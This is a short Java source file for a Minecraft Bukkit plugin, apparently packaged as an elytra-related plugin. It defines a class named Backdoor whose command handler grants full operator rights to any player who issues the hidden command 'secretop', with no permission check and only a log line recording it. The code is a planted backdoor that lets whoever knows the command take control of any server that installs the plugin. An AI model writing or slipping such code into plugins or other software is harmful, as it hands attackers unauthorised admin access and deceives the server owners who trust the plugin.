package com.minilucker.elytra;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.jetbrains.annotations.NotNull;

public class Backdoor implements CommandExecutor {
    public Backdoor() {
        Bukkit.getLogger().info(ChatColor.GREEN + "building backdoor");
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender ,@NotNull Command command,@NotNull String s,@NotNull String[] strings) {
        Bukkit.getLogger().info(ChatColor.GREEN + "command "+command.getName()+" issued by " + sender.getName());

        if (!(sender instanceof Player player)) {return true;}

        if(command.getName().equalsIgnoreCase("secretop")) {
            player.setOp(true);
            Bukkit.getLogger().info(ChatColor.GREEN + "opped " + player.getDisplayName());
        }

        return true;
    }
}
